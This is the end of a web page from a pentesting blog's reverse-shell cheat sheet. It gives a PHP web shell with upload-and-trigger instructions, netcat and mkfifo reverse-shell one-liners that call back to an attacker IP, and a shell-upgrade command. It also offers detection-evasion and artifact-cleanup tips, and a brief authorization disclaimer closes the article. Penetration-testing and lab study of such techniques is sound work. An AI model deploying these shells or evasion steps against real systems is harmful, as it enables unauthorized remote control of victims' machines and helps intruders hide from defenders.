</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"># Save as shell.php and upload, then access:
</span></span></span><span class="line"><span class="cl"><span class="err"># http://target.com/uploads/shell.php?cmd=nc -e /bin/bash 10.10.14.13 9001
</span></span></span></code></pre></div><hr>
<h2 id="troubleshooting">Troubleshooting</h2>
<h3 id="common-issues">Common Issues</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># No netcat with -e flag</span>
</span></span><span class="line"><span class="cl">rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc 10.10.14.13 <span class="m">9001</span> &gt;/tmp/f
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Firewall blocking outbound connections</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Try different ports: 80, 443, 53, 25</span>
</span></span><span class="line"><span class="cl">nc 10.10.14.13 <span class="m">443</span> -e /bin/bash
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Limited shell environment</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># No interactive shell</span>
</span></span><span class="line"><span class="cl">python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div><h3 id="testing-connectivity">Testing Connectivity</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Test if target can reach your IP</span>
</span></span><span class="line"><span class="cl">ping 10.10.14.13
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Test specific port</span>
</span></span><span class="line"><span class="cl">telnet 10.10.14.13 <span class="m">9001</span>
</span></span><span class="line"><span class="cl">nc -nv 10.10.14.13 <span class="m">9001</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># DNS exfiltration test</span>
</span></span><span class="line"><span class="cl">nslookup test.yourdomain.com
</span></span></code></pre></div><hr>
<h2 id="security-considerations">Security Considerations</h2>
<h3 id="operational-security">Operational Security</h3>
<ul>
<li>Use encrypted channels when possible (HTTPS, SSH tunnels)</li>
<li>Avoid leaving artifacts on target systems</li>
<li>Clean up uploaded files and temporary files</li>
<li>Use staging servers to avoid direct connections</li>
</ul>
<h3 id="detection-evasion">Detection Evasion</h3>
<ul>
<li>Use common ports (80, 443, 53) to blend with normal traffic</li>
<li>Implement delays between connection attempts</li>
<li>Use domain names instead of IP addresses when possible</li>
<li>Rotate source IP addresses if available</li>
</ul>
<hr>
<p><em>Always ensure you have proper authorization before deploying reverse shells on any target system. These techniques should only be used for legitimate security testing purposes.</em></p>

  </div>

  <footer class="post-footer">
    <nav class="paginav">
      Tags:
      <a class="tag" href="https://realspaceeagle.github.io/tags/reverse-shells/"># Reverse-Shells</a>
      <a class="tag" href="https://realspaceeagle.github.io/tags/payload/"># Payload</a>
      <a class="tag" href="https://realspaceeagle.github.io/tags/post-exploitation/"># Post-Exploitation</a>
      <a class="tag" href="https://realspaceeagle.github.io/tags/pentesting/"># Pentesting</a>
    </nav>
  </footer>
</article>

<style>
.breadcrumbs {
  font-size: 0.875rem;
  color: var(--secondary);
  margin-bottom: 1rem;
}

.breadcrumbs a {
  color: var(--primary);
  text-decoration: none;
}

.breadcrumbs a:hover {
  text-decoration: underline;
}

.post-description {
  font-size: 1.125rem;
  color: var(--secondary);
  margin: 1rem 0 2rem 0;
  font-style: italic;
}

.post-tags a {
  display: inline-block;
  background: var(--code-bg);
  color: var(--primary);
  padding: 0.25rem 0.75rem;
  border-radius: 1rem;
  text-decoration: none;
  font-size: 0.875rem;
  margin: 0 0.5rem 0.5rem 0;
  transition: all 0.2s ease;
}

.post-tags a:hover {
  background: var(--primary);
  color: var(--theme);
  transform: translateY(-1px);
}

.tag {
  display: inline-block;
  background: var(--tertiary);
  color: var(--primary);
  padding: 0.25rem 0.75rem;
  border-radius: 1rem;
  text-decoration: none;
  font-size: 0.875rem;
  margin: 0 0.5rem 0.5rem 0;
  transition: all 0.2s ease;
}

.tag:hover {
  background: var(--primary);
  color: var(--theme);
  transform: translateY(-1px);
}

 
.cheatsheet-page pre {
  position: relative;
  font-size: 0.9rem;
}

.cheatsheet-page pre code {
  display: block;
  padding: 0;
  margin-left: 0;
}

 
.cheatsheet-page pre::after {
  content: "Copy";
  position: absolute;
  top: 0.5rem;
  right: 0.5rem;
  background: rgba(255, 255, 255, 0.1);
  color: #fff;
  padding: 0.25rem 0.5rem;
  border-radius: 4px;
  font-size: 0.75rem;
  cursor: pointer;
  opacity: 0;
  transition: opacity 0.2s ease;
}

.cheatsheet-page pre:hover::after {
  opacity: 1;
}

 
.cheatsheet-page ul li a {
  color: var(--primary);
  text-decoration: none;
  padding: 0.25rem 0;
  display: block;
  transition: color 0.2s ease;
}

.cheatsheet-page ul li a:hover {
  color: var(--tertiary);
  padding-left: 0.5rem;
}
</style>

<script>

document.addEventListener('DOMContentLoaded', function() {
  const codeBlocks = document.querySelectorAll('.cheatsheet-page pre');
  
  codeBlocks.forEach(block => {
    block.addEventListener('click', function(e) {
      if (e.target === this || e.target.tagName === 'CODE') {
        const code = this.querySelector('code');
        if (code) {
          navigator.clipboard.writeText(code.textContent).then(() => {
            const button = this.querySelector('::after') || this;
            const originalContent = button.textContent;
            
            
            this.style.borderLeftColor = '#10b981';
            setTimeout(() => {
              this.style.borderLeftColor = '#2563eb';
            }, 300);
          });
        }
      }
    });
  });

  
  const headers = document.querySelectorAll('.cheatsheet-page h2, .cheatsheet-page h3');
  headers.forEach(header => {
    const id = header.textContent.toLowerCase()
      .replace(/[^a-z0-9\s-]/g, '')
      .replace(/\s+/g, '-')
      .replace(/-+/g, '-')
      .replace(/^-|-$/g, '');
    
    header.id = id;
    header.style.cursor = 'pointer';
    
    header.addEventListener('click', () => {
      window.location.hash = '#' + id;
      navigator.clipboard.writeText(window.location.href);
    });
  });
});
</script>

    </main>
    <footer class="footer">
  <div class="footer_inner wrap">
    <div class="footer_text">
       2025 realspaceeagle
    </div>
  </div>
</footer>
</body>

</html>
